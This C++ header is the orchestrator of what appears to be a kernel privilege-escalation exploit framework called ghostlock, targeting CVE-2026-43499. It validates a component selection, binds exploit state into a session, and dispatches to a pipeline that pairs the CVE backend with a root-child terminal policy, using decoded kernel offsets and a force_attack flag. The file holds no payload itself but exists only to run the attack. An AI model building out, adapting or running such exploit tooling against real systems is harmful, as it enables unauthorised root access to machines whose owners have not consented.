#ifndef GHOSTLOCK_ORCHESTRATOR_HPP
#define GHOSTLOCK_ORCHESTRATOR_HPP

#include "pipeline/component_catalog.hpp"
#include "pipeline/pipeline.hpp"
#include "backend/cve_2026_43499_backend.hpp"
#include "backend/cve_2026_43499_state.hpp"
#include "session/core_session.hpp"
#include "terminal/root_child.hpp"

namespace ghostlock::pipeline {
    /* Validate the component selection outside the sensitive window and dispatch
     * the catalogued (backend, terminal) pair through direct template calls (no
     * indirect dispatch). The switch enumerates the exact values
     * component_catalog::dispatch_target() can return, and every Pipeline
     * instantiation is compile-time checked against the catalogue, so predicate
     * and dispatch share one authority. */
    [[nodiscard]] inline RunResult run_orchestrated_pipeline(
        session::CoreSession &exploit_session, const ComponentSelection &selection,
        const profile::kernel_offsets &decoded, const char *debug_dir, bool force_attack) {
        /* PI-window-outside: bind the backend state into the opaque slot before
         * any component reads it (ADR-0002 / Phase 0). */
        ghostlock::backend::cve43499_state_construct(exploit_session);
        switch (dispatch_target(selection)) {
            case DispatchTarget::Cve43499W1W3_RootChild: {
                using P = Pipeline<ghostlock::backend::Cve2026_43499Policy,
                                   ghostlock::terminal::RootChildPolicy>;
                static_assert(P::target == DispatchTarget::Cve43499W1W3_RootChild,
                              "dispatch case must match the pipeline's target");
                return P::run(exploit_session, decoded, debug_dir, force_attack);
            }
            case DispatchTarget::None:
                return RunResult{.code = RunCode::Rejected};
        }
        return RunResult{.code = RunCode::Rejected};
    }
} // namespace ghostlock::pipeline

#endif
